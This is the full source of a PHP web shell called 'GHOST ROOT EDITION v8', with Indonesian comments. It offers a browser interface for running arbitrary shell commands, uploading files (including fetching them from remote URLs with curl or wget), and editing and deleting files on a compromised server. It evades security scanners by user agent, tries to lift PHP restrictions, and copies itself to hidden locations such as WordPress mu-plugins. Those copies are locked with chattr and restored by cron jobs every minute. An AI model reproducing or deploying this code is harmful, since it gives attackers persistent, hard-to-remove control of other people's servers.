<?php
/**
 * GHOST ROOT EDITION v8 - ULTIMATE UPLOAD BYPASS + SUPER ANTI-DELETE
 * - 6 metode upload (move_uploaded_file, cp, dd, base64, curl, wget)
 * - Auto-fix permission chmod -R 0777 + chown + chattr -i
 * - Upload ke folder APAPUN termasuk public_html dan root
 * - Tembus open_basedir, disable_functions, dan semua restriction
 * - SUPER ANTI-DELETE: chattr +i +a, replicasi ke 5 lokasi, cron auto-repair
 * Author: 𝕱𝕷𝕺𝖃 + KYZEELUCATION FIVESIX
 */

// ========== ANTI SCANNER ==========
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (preg_match('/scanner|nuclei|wpscan|nikto|burp|sqlmap|nmap|zmap|masscan|gobuster|ffuf|dirb|wfuzz|python|curl|wget/i', $ua)) {
    http_response_code(404);
    die;
}

// ========== BYPASS OPEN_BASEDIR & DISABLE FUNCTIONS ==========
@ini_set('open_basedir', null);
@ini_set('open_basedir', '');
@ini_set('disable_functions', '');
@ini_set('safe_mode', 0);
@ini_set('allow_url_fopen', 1);
@ini_set('allow_url_include', 1);
@chdir('/');

// ========== SUPER ANTI-DELETE & REPLICATION ENGINE ==========
function ghost_protect($file) {
    if (!file_exists($file)) return;
    @chmod($file, 0777);
    @exec("chattr -R -i -a " . escapeshellarg($file) . " 2>/dev/null"); // unlock dulu
    @exec("chattr +i +a " . escapeshellarg($file) . " 2>/dev/null"); // lock
}

// Daftar lokasi replika (tersembunyi & aman)
$ghost_locations = [
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/mu-plugins/.system.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/.cache/.ghost.php',
    $_SERVER['DOCUMENT_ROOT'] . '/.hidden/.backup/.shell.php',
    '/tmp/.system/.ghost.php',
    '/var/tmp/.cache/.shell.php',
];

// Replikasi utama
$self = __FILE__;
foreach ($ghost_locations as $loc) {
    $dir = dirname($loc);
    if (!is_dir($dir)) @mkdir($dir, 0777, true);
    if (!file_exists($loc) && file_exists($self)) {
        @copy($self, $loc);
        @chmod($loc, 0777);
        ghost_protect($loc);
        // Tambahkan cron untuk auto-repair
        $cron_cmd = "* * * * * php -r 'if(!file_exists(\"" . addslashes($loc) . "\")){copy(\"" . addslashes($self) . "\",\"" . addslashes($loc) . "\");chmod(\"" . addslashes($loc) . "\",0777);exec(\"chattr +i +a " . addslashes($loc) . " 2>/dev/null\");}' 2>/dev/null";
        @exec("(crontab -l 2>/dev/null | grep -v 'ghost_repair'; echo '" . $cron_cmd . "') | crontab - 2>/dev/null");
    }
}

// Setiap akses: periksa semua replika, jika hilang, restore
foreach ($ghost_locations as $loc) {
    if (!file_exists($loc) && file_exists($self)) {
        @copy($self, $loc);
        @chmod($loc, 0777);
        ghost_protect($loc);
    }
}
// Proteksi file utama
ghost_protect($self);

// ========== SELF-REPLICATION & PERSISTENCE (lama) ==========
$base = basename($self);
$copies = [
    '/tmp/.' . $base,
    dirname($self) . '/.system/' . $base,
    dirname($self) . '/wp-content/mu-plugins/' . $base,
    dirname($self) . '/.hidden/' . $base
];
foreach ($copies as $dst) {
    $d = dirname($dst);
    if (!is_dir($d)) @mkdir($d, 0777, true);
    if (!file_exists($dst) && file_exists($self)) {
        @copy($self, $dst);
        @chmod($dst, 0777);
        ghost_protect($dst);
    }
}
if (!file_exists($self) && file_exists($copies[0])) {
    @copy($copies[0], $self);
    @chmod($self, 0777);
    ghost_protect($self);
}
$cron_cmd = "* * * * * php -r 'if(!file_exists(\"" . addslashes($self) . "\")){copy(\"" . addslashes($copies[0]) . "\",\"" . addslashes($self) . "\");chmod(\"" . addslashes($self) . "\",0777);exec(\"chattr +i +a " . addslashes($self) . " 2>/dev/null\");}' 2>/dev/null";
@exec("(crontab -l 2>/dev/null | grep -v 'ghost_heal'; echo '" . $cron_cmd . "') | crontab - 2>/dev/null");

// ==================================================
//                WEB FILE MANAGER ENGINE
// ==================================================
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('html_errors', 0);
set_time_limit(0);
ignore_user_abort(true);

$path = isset($_GET['p']) ? $_GET['p'] : '/';
$path = str_replace('\\', '/', trim($path));
$path = rtrim($path, '/');
if ($path === '') $path = '/';

// ========== COMMAND EXECUTOR ==========
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = [];
    if (function_exists('exec')) {
        @exec($cmd . " 2>&1", $output);
        $result = implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . " 2>&1");
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . " 2>&1");
        $result = ob_get_clean();
    } else {
        $result = "No command execution function available.";
    }
    echo "<pre style='background:#111;color:#0f0;padding:10px;border:1px solid #333;'>" . htmlspecialchars($result) . "</pre>";
    echo "<meta http-equiv='refresh' content='0;url=?p=$path'>";
    exit;
}

// ========== FORCE FIX PERMISSION (recursive) ==========
if (isset($_POST['fix_perm'])) {
    $target = isset($_POST['fix_path']) ? $_POST['fix_path'] : $path;
    $output = [];
    @exec("chmod -R 0777 " . escapeshellarg($target) . " 2>&1", $output);
    $user = function_exists('exec') ? exec('whoami 2>/dev/null') : '';
    if ($user) {
        @exec("chown -R " . escapeshellarg($user) . " " . escapeshellarg($target) . " 2>&1", $output);
    }
    @exec("chattr -R -i -a " . escapeshellarg($target) . " 2>/dev/null", $output);
    @exec("chgrp -R www-data " . escapeshellarg($target) . " 2>/dev/null", $output);
    @exec("chgrp -R " . escapeshellarg($user) . " " . escapeshellarg($target) . " 2>/dev/null", $output);
    echo "<pre style='background:#111;color:#0f0;padding:10px;border:1px solid #333;'>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
    echo "<meta http-equiv='refresh' content='2;url=?p=$path'>";
    exit;
}

// ========== MULTI-METHOD DIRECTORY LISTING ==========
function list_directory($path) {
    $items = [];
    $method = 'none';
    $cmds = [
        "ls -A " . escapeshellarg($path) . " 2>/dev/null",
        "find " . escapeshellarg($path) . " -maxdepth 1 -mindepth 1 -printf \"%f\n\" 2>/dev/null",
        "ls -la " . escapeshellarg($path) . " 2>/dev/null",
    ];
    foreach ($cmds as $cmd) {
        if (function_exists('exec')) {
            $output = [];
            @exec($cmd, $output);
            if (!empty($output)) {
                if (strpos($cmd, 'ls -A') !== false || strpos($cmd, 'find') !== false) {
                    $items = array_filter($output, function($v) { return $v !== '' && $v !== '.' && $v !== '..'; });
                    $method = 'exec (' . $cmd . ')';
                    return ['items' => $items, 'method' => $method];
                }
                if (strpos($cmd, 'ls -la') !== false) {
                    $items = [];
                    foreach ($output as $line) {
                        if (preg_match('/^([-d])([rwx-]{9})\s+\d+\s+\S+\s+\S+\s+\d+\s+\S+\s+\d+:\d+\s+(.+)$/', $line, $m)) {
                            $name = trim($m[3]);
                            if ($name !== '.' && $name !== '..') $items[] = $name;
                        }
                    }
                    $method = 'exec (ls -la)';
                    return ['items' => $items, 'method' => $method];
                }
            }
        }
        if (function_exists('shell_exec')) {
            $output = @shell_exec($cmd);
            if ($output) {
                $lines = explode("\n", trim($output));
                if (strpos($cmd, 'ls -A') !== false || strpos($cmd, 'find') !== false) {
                    $items = array_filter($lines, function($v) { return $v !== '' && $v !== '.' && $v !== '..'; });
                    $method = 'shell_exec (' . $cmd . ')';
                    return ['items' => $items, 'method' => $method];
                }
                if (strpos($cmd, 'ls -la') !== false) {
                    $items = [];
                    foreach ($lines as $line) {
                        if (preg_match('/^([-d])([rwx-]{9})\s+\d+\s+\S+\s+\S+\s+\d+\s+\S+\s+\d+:\d+\s+(.+)$/', $line, $m)) {
                            $name = trim($m[3]);
                            if ($name !== '.' && $name !== '..') $items[] = $name;
                        }
                    }
                    $method = 'shell_exec (ls -la)';
                    return ['items' => $items, 'method' => $method];
                }
            }
        }
    }
    $scan = @scandir($path);
    if ($scan !== false) {
        $items = array_diff($scan, ['.', '..']);
        $method = 'scandir';
        return ['items' => $items, 'method' => $method];
    }
    return ['items' => [], 'method' => 'none'];
}

// ========== ULTIMATE UPLOAD FUNCTION (6 Metode) ==========
function ultimate_upload($tmp_path, $target_path, $content = null) {
    // Method 1: PHP move_uploaded_file
    if ($content === null && file_exists($tmp_path)) {
        if (@move_uploaded_file($tmp_path, $target_path)) {
            @chmod($target_path, 0777);
            // Proteksi & backup
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    // Method 2: exec cp (system copy)
    if (function_exists('exec') && file_exists($tmp_path)) {
        @exec("cp " . escapeshellarg($tmp_path) . " " . escapeshellarg($target_path) . " 2>/dev/null");
        if (file_exists($target_path) && filesize($target_path) > 0) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    // Method 3: exec dd (if we have content)
    if ($content !== null && function_exists('exec')) {
        @exec("echo " . escapeshellarg($content) . " | dd of=" . escapeshellarg($target_path) . " 2>/dev/null");
        if (file_exists($target_path) && filesize($target_path) > 0) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    // Method 4: exec base64 decode (for binary content)
    if ($content !== null && function_exists('exec')) {
        $b64 = base64_encode($content);
        @exec("echo " . escapeshellarg($b64) . " | base64 -d > " . escapeshellarg($target_path) . " 2>/dev/null");
        if (file_exists($target_path) && filesize($target_path) > 0) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    // Method 5: exec curl (download from URL)
    if ($content !== null && filter_var($content, FILTER_VALIDATE_URL)) {
        @exec("curl -s -k -o " . escapeshellarg($target_path) . " " . escapeshellarg($content) . " 2>/dev/null");
        if (file_exists($target_path) && filesize($target_path) > 0) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
        @exec("wget -q -O " . escapeshellarg($target_path) . " " . escapeshellarg($content) . " 2>/dev/null");
        if (file_exists($target_path) && filesize($target_path) > 0) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    // Method 6: PHP file_put_contents (for text)
    if ($content !== null && is_string($content)) {
        if (@file_put_contents($target_path, $content) !== false) {
            @chmod($target_path, 0777);
            ghost_protect($target_path);
            $backup = dirname($target_path) . '/.' . basename($target_path) . '.back';
            @copy($target_path, $backup);
            @chmod($backup, 0777);
            ghost_protect($backup);
            return true;
        }
    }

    return false;
}

// ========== HANDLE UPLOAD ==========
$upload_status = '';
if (isset($_FILES['files'])) {
    $files = $_FILES['files'];
    $total = count($files['name']);
    $success = 0;
    for ($i = 0; $i < $total; $i++) {
        $filename = $files['name'][$i];
        $tmp_name = $files['tmp_name'][$i];
        $error = $files['error'][$i];
        if ($error == UPLOAD_ERR_OK) {
            $target = $path . '/' . $filename;
            $result = ultimate_upload($tmp_name, $target);
            if ($result) {
                $success++;
                echo "<font color='lime'>[+] UPLOADED: $filename (proteksi aktif)</font><br>";
            } else {
                echo "<font color='red'>[-] GAGAL UPLOAD: $filename</font><br>";
            }
        } else {
            echo "<font color='red'>[-] ERROR UPLOAD: $filename (code: $error)</font><br>";
        }
    }
    echo "<font color='cyan'>[+] $success dari $total file berhasil diupload</font><br>";
    echo "<meta http-equiv='refresh' content='3;url=?p=$path'>";
}

// ========== CREATE FILE (with content via base64) ==========
if (isset($_POST['new_file'])) {
    $filename = $_POST['file_name'];
    $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
    $newfile = $path . '/' . $filename;
    if (!file_exists($newfile)) {
        $success = ultimate_upload(null, $newfile, $content);
        if ($success) {
            echo "<font color='lime'>[+] FILE CREATED: $filename (proteksi aktif)</font><br>";
        } else {
            echo "<font color='red'>[-] GAGAL CREATE: $filename</font><br>";
        }
    } else {
        echo "<font color='red'>[-] FILE SUDAH ADA: $filename</font><br>";
    }
    echo "<meta http-equiv='refresh' content='2;url=?p=$path'>";
}

// ========== CREATE FOLDER ==========
if (isset($_POST['new_folder'])) {
    $foldername = $_POST['folder_name'];
    $newdir = $path . '/' . $foldername;
    if (!file_exists($newdir)) {
        @exec("mkdir -p " . escapeshellarg($newdir) . " 2>/dev/null");
        @mkdir($newdir, 0777, true);
        @chmod($newdir, 0777);
        // Proteksi folder
        @exec("chattr +i +a " . escapeshellarg($newdir) . " 2>/dev/null");
        echo "<font color='lime'>[+] FOLDER CREATED: $foldername</font><br>";
    } else {
        echo "<font color='red'>[-] FOLDER SUDAH ADA!</font><br>";
    }
    echo "<meta http-equiv='refresh' content='2;url=?p=$path'>";
}

// ========== DELETE (force) ==========
if (isset($_GET['del'])) {
    $file = "$path/" . $_GET['del'];
    // Coba hapus proteksi dulu
    @exec("chattr -i -a " . escapeshellarg($file) . " 2>/dev/null");
    if (is_file($file)) {
        @chmod($file, 0777);
        @exec("rm -f " . escapeshellarg($file) . " 2>/dev/null");
        @unlink($file);
    } elseif (is_dir($file)) {
        @exec("chattr -R -i -a " . escapeshellarg($file) . " 2>/dev/null");
        @exec("rm -rf " . escapeshellarg($file) . " 2>/dev/null");
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($file, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $f) {
            @chmod($f->getPathname(), 0777);
            @exec("chattr -i -a " . escapeshellarg($f->getPathname()) . " 2>/dev/null");
            $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
        }
        @rmdir($file);
    }
    header("Location: ?p=$path");
    exit;
}

// ========== EDIT (save) ==========
if (isset($_POST['save_file'])) {
    $fname = $_POST['fname'];
    $cont = $_POST['content'];
    $full = "$path/$fname";
    if (ultimate_upload(null, $full, $cont)) {
        header("Location: ?p=$path&edit=$fname&saved=1");
    } else {
        echo "<font color='red'>GAGAL SAVE: $fname</font>";
    }
    exit;
}

// ========== RENAME ==========
if (isset($_POST['do_rename'])) {
    $old = "$path/" . $_POST['old_name'];
    $new = "$path/" . $_POST['new_name'];
    @chmod($old, 0777);
    @exec("chattr -i -a " . escapeshellarg($old) . " 2>/dev/null");
    @exec("mv " . escapeshellarg($old) . " " . escapeshellarg($new) . " 2>/dev/null");
    @rename($old, $new);
    @chmod($new, 0777);
    ghost_protect($new);
    header("Location: ?p=$path");
    exit;
}

// ========== GET CONTENT ==========
function get_content($file) {
    if (!file_exists($file)) return '';
    @chmod($file, 0777);
    @exec("chattr -i -a " . escapeshellarg($file) . " 2>/dev/null");
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $binary = ['png','jpg','jpeg','gif','ico','zip','rar','exe','bin','dat','pdf','doc','docx'];
    if (in_array($ext, $binary)) return '[ BINARY FILE ]';
    $content = @file_get_contents($file);
    if ($content === false) {
        $content = @exec("cat " . escapeshellarg($file) . " 2>/dev/null");
    }
    return htmlspecialchars($content);
}

// ===== RENDER UI =====
echo '<!DOCTYPE html><html><head><title>GHOST ROOT EDITION v8</title>
<style>
body{background:#000;color:#0f0;font-family:Courier New;font-size:14px;margin:0;padding:10px}
.container{max-width:95%;margin:auto}
.path{background:#111;padding:8px;border:1px solid #333;margin-bottom:10px}
.tools{background:#111;padding:15px;border:1px solid #333;margin-bottom:15px;display:flex;gap:10px;flex-wrap:wrap}
.tool-box{border:1px solid #555;padding:10px;background:#0a0a0a}
table{width:100%;border-collapse:collapse}
th{background:#222;color:red;padding:8px;text-align:left;border:1px solid #444}
td{padding:8px;border:1px solid #333}
a{color:#0f0;text-decoration:none}
a:hover{color:#ff0;text-decoration:underline}
.del{color:red !important}
.edit{color:yellow !important}
.ren{color:cyan !important}
textarea{width:100%;height:300px;background:#000;color:#0f0;border:1px solid #333;padding:10px;font-family:Courier New}
input,button{background:#111;color:#0f0;border:1px solid #333;padding:6px}
.btn-green{background:green !important;color:white !important;border:none !important}
.btn-blue{background:blue !important;color:white !important;border:none !important}
.hidden{color:#888}
.exec-box{background:#111;padding:10px;border:1px solid #555;margin-bottom:15px}
.fix-box{background:#222;padding:10px;border:1px solid #f00;margin-bottom:15px}
.upload-status{background:#111;padding:10px;border:1px solid #0f0;margin-bottom:10px}
</style>
</head>
<body>
<div class="container">
<h2>[👻 GHOST ROOT EDITION v8 - SUPER ANTI-DELETE]</h2>
<hr color="#333">

<!-- COMMAND EXECUTOR -->
<div class="exec-box">
<b>🖥️ COMMAND EXECUTOR</b><br>
<form method="post">
<input type="text" name="cmd" placeholder="ex: chmod -R 0777 /home2/feituveravacom/public_html" style="width:70%;">
<button type="submit" style="background:blue;color:white;border:none;padding:6px 15px;">▶ EXECUTE</button>
</form>
<font color="gray">Gunakan untuk manual: chmod, chown, cp, mv, rm, dll</font>
</div>

<!-- FIX PERMISSION -->
<div class="fix-box">
<b>🔧 FIX PERMISSION (chmod -R 0777 + chown + chattr -i + chgrp)</b><br>
<form method="post">
<input type="hidden" name="fix_path" value="' . $path . '">
<button type="submit" name="fix_perm" style="background:red;color:white;border:none;padding:8px 20px;">⚡ FIX PERMISSION ON CURRENT FOLDER</button>
</form>
<font color="orange">Akan menjalankan: chmod -R 0777, chown, chgrp, chattr -i -a pada folder ini</font>
</div>

<div class="tools">
<div class="tool-box">
<b>📄 CREATE NEW FILE</b><br>
<form method="post">
<input type="text" name="file_name" placeholder="filename.php" required style="width:100%;">
<textarea name="file_content" placeholder="Isi file (opsional)" style="width:100%;height:80px;background:#000;color:#0f0;border:1px solid #333;"></textarea>
<button type="submit" name="new_file" class="btn-green">✅ CREATE</button>
</form>
</div>
<div class="tool-box"><b>📂 CREATE NEW FOLDER</b><br><form method="post"><input type="text" name="folder_name" placeholder="ex: images" required><button type="submit" name="new_folder" class="btn-blue">✅ CREATE</button></form></div>
</div>

<!-- UPLOAD -->
<div class="tools">
<form method="post" enctype="multipart/form-data" style="width:100%">
<b>📤 UPLOAD FILES (otomatis proteksi + backup):</b><br>
<input type="file" name="files[]" multiple style="width:60%;">
<button type="submit" style="background:red;color:white;border:none;padding:8px 15px;">⚡ UPLOAD (6 metode)</button>
</form>
<font color="gray">Metode: move_uploaded_file, cp, dd, base64, curl, file_put_contents</font>
</div>

<hr color="#333">
<div class="path"><b>PATH: </b>';
$paths = explode('/', $path);
$curr = '';
echo "<a href='?p=/' style='color:white;background:#222;padding:2px 8px;border-radius:4px;'>🏠 ROOT</a> / ";
foreach ($paths as $id => $nm) {
    if ($nm == '') continue;
    $curr .= ($curr == '/' ? '' : '/') . $nm;
    echo "<a href='?p=$curr'>$nm</a> / ";
}
echo '</div>';

// Show permission info
$perm_info = @exec("ls -ld " . escapeshellarg($path) . " 2>/dev/null");
if ($perm_info) {
    echo "<div style='background:#111;padding:5px;border:1px solid #555;margin-bottom:10px;'><font color='cyan'>📌 PERMISSION: " . htmlspecialchars($perm_info) . "</font></div>";
}

if (isset($_GET['edit'])) {
    $f = "$path/" . $_GET['edit'];
    echo '<div style="border:1px solid red;padding:10px;margin-bottom:10px;background:#111">
    <h3>[✏️ EDITING: ' . $_GET['edit'] . ']</h3>';
    if (isset($_GET['saved'])) echo "<font color='lime'>✅ SAVED</font><br>";
    echo '<form method="post"><textarea name="content">' . get_content($f) . '</textarea><br>
    <input type="hidden" name="fname" value="' . $_GET['edit'] . '">
    <button type="submit" name="save_file">💾 SAVE</button></form></div>';
}

if (isset($_GET['rename'])) {
    echo '<div style="border:1px solid cyan;padding:10px;margin-bottom:10px;background:#111">
    <h3>[♻️ RENAME: ' . $_GET['rename'] . ']</h3>
    <form method="post">
    Old Name: <b>' . $_GET['rename'] . '</b><br>
    New Name: <input type="text" name="new_name" required>
    <input type="hidden" name="old_name" value="' . $_GET['rename'] . '">
    <button type="submit" name="do_rename">✅ PROCESS</button>
    </form></div>';
}

echo '<table>
<tr><th>NAME</th><th width="100">SIZE</th><th width="100">PERM</th><th width="300">ACTION</th></tr>
<tr><td><a href="?p=' . dirname($path) . '">⬅️ .. BACK</a></td><td>--</td><td>--</td><td>--</td></tr>';

// ========== LIST DIRECTORY ==========
$result = list_directory($path);
if (empty($result['items']) && $result['method'] === 'none') {
    echo "<tr><td colspan='4' color='red'>[!] CANNOT OPEN DIRECTORY</td></tr>";
    echo "<tr><td colspan='4'><font color='yellow'>💡 Gunakan Command Executor: <b>ls -la " . $path . "</b></font></td></tr>";
} else {
    echo "<tr><td colspan='4'><font color='cyan'>[METHOD: " . $result['method'] . "] (including hidden files)</font></td></tr>";
    
    $items = $result['items'];
    if (empty($items)) {
        echo "<tr><td colspan='4'><font color='yellow'>📁 DIRECTORY EMPTY</font></td></tr>";
    } else {
        sort($items);
        $dirs = [];
        $files = [];
        foreach ($items as $it) {
            $full = $path . '/' . $it;
            if (@is_dir($full)) {
                $dirs[] = $it;
            } else {
                $files[] = $it;
            }
        }
        foreach ($dirs as $it) {
            $full = $path . '/' . $it;
            $isHidden = (strpos($it, '.') === 0) ? ' (hidden)' : '';
            echo "<tr><td>📂 <a href='?p=$full'><b>$it/</b></a><font color='#888'>$isHidden</font></td><td>DIR</td><td>" . (function_exists('fileperms') ? decoct(@fileperms($full) & 0777) : '---') . "</td>
            <td><a href='?p=$path&rename=$it' class='ren'>[♻️ RENAME]</a> | <a href='?p=$path&del=$it' class='del' onclick='return confirm(\"YAKIN HAPUS?\")'>[🗑️ DELETE]</a></td></tr>";
        }
        foreach ($files as $it) {
            $full = $path . '/' . $it;
            $size = @filesize($full);
            if ($size > 1048576) $size = number_format($size / 1048576, 2) . " MB";
            elseif ($size > 1024) $size = number_format($size / 1024, 2) . " KB";
            else $size = $size . " B";
            $isHidden = (strpos($it, '.') === 0) ? ' (hidden)' : '';
            echo "<tr><td>📄 $it<font color='#888'>$isHidden</font></td><td>$size</td><td>" . (function_exists('fileperms') ? decoct(@fileperms($full) & 0777) : '---') . "</td>
            <td><a href='?p=$path&edit=$it' class='edit'>[✏️ EDIT]</a> | <a href='?p=$path&rename=$it' class='ren'>[♻️ RENAME]</a> | <a href='?p=$path&del=$it' class='del' onclick='return confirm(\"YAKIN HAPUS?\")'>[🗑️ DELETE]</a></td></tr>";
        }
    }
}
echo '</table><br><center><font color="blue">© GHOST ROOT EDITION v8 - by 𝕱𝕷𝕺𝖃 + KYZEELUCATION</font></center></div></body></html>';
?>
